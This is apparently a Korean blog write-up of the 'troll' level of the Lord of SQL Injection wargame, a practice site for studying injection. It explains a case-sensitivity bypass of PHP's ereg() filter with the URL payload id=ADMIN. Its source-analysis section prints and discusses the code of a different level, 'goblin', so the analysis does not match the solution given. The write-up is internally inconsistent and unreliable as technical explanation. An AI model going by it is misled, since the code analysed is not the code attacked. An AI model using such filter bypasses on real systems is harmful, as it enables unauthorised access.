---
title: Lord of SQL Injection Write Up No.8 Troll
date: 2019-08-19 20:21:10
updated:
categories:
  - Write Up
tags:
  - Lord of SQL Injection
  - Infosec
---

## 개요

{% img /image/los-main.png 300 %}

SQL Injection에 대한 지식을 쌓기 위해 [Lord of SQL Injection 사이트](https://los.eagle-jump.org/)의 문제를 풀고 해답을 정리한다.

이 문서에서는 Lord of SQL Injection 8번 troll 문제에 대하여 정리한다.

<!-- more -->

## 문제 분석

### 문제 출제 의도

`admin`을 필터링하는 `ereg()` 함수를 우회하여 `id`값으로 `admin`을 전달할 수 있는지 확인한다.

### 필요 배경 지식

#### ereg

```php
int ereg ( string $pattern , string $string [, array &$regs ] )
```

- `ereg` 함수는 문자열에서 **대소문자를 구분하여** 정규표현식 매치를 수행한다.
- 반환값은 매치된 문자열의 길이 또는 `FALSE` 이다.
- php의 `ereg` 함수에 대해 잘 모르겠다면 다음 링크를 참고하자.
- [PHP: ereg - Manual](http://php.net/manual/kr/function.ereg.php)

#### MySQL 대소문자 구별

- MySQL은 기본적으로 대소문자 구별을 하지 않는다.
- MySQL의 대소문자 구별에 대한 자세한 내용을 알고 싶다면 다음 링크를 참고하자.
- [MySQL 대소문자 구별 - 제타위키](https://zetawiki.com/wiki/MySQL_%EB%8C%80%EC%86%8C%EB%AC%B8%EC%9E%90_%EA%B5%AC%EB%B3%84)

### 소스 코드 분석

goblin 문제의 php 소스 코드는 다음과 같다.

```php
<?php
  include "./config.php";
  login_chk();
  dbconnect();
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~");
  if(preg_match('/\'|\"|\`/i', $_GET[no])) exit("No Quotes ~_~");
  $query = "select id from prob_goblin where id='guest' and no={$_GET[no]}";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysql_fetch_array(mysql_query($query));
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>";
  if($result['id'] == 'admin') solve("goblin");
  highlight_file(__FILE__);
?>
```

#### Filter

```php
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~");
  if(preg_match('/\'|\"|\`/i', $_GET[no])) exit("No Quotes ~_~");
```

- GET 방식으로 `no`를 받고, `no`에 `prob`, `_`, `.`, `()` 가 들어 있으면 `No Hack ~_~`이 뜨고 문제 풀이에 실패한다.
- 또한, `no`에 `'`, `"`, \` 가 들어 있으면 `No Quotes ~_~`가 뜨고 문제 풀이에 실패한다.

#### Query

```php
  $query = "select id from prob_goblin where id='guest' and no={$_GET[no]}";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysql_fetch_array(mysql_query($query));
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>";
  if($result['id'] == 'admin') solve("goblin");
```

- 받은 `no`가 직접 쿼리에 들어간다. 이것으로 SQL Injection 공격이 가능하다는 것을 알 수 있다.
- 문제 풀이가 성공하는 조건은 '데이터베이스에서 받은 `id`에 `"admin"`이라는 값이 들어있음'이다.

## Solution

1. 대소문자 구분 이용

   PHP의 `ereg()` 함수 부분을 보면

   ```php
   if(@ereg("admin",$_GET[id])) exit("HeHe");
   ```

   정규 표현식으로 `"admin"` 을 전달하는 것을 알 수 있다.
   `ereg()` 함수는 대소문자를 구분하기 때문에, 이런 경우 `admin` 이라는 문자열만 매치하게 된다.

   그러나 기본적으로 MySQL에서는 대소문자를 구분하지 않는다.
   따라서 입력값으로 `Admin`, `ADMIN` 과 같이 대문자를 섞은 값을 넣으면 `ereg()` 함수에서 필터링이 이루어지지 않아 문제가 풀리게 된다.

   ```url
   http://los.eagle-jump.org/troll_6d1f080fa30a07dbaf7342285ba0e158.php?id=ADMIN
   ```

   ```sql
   select id from prob_troll where id='ADMIN'
   ```
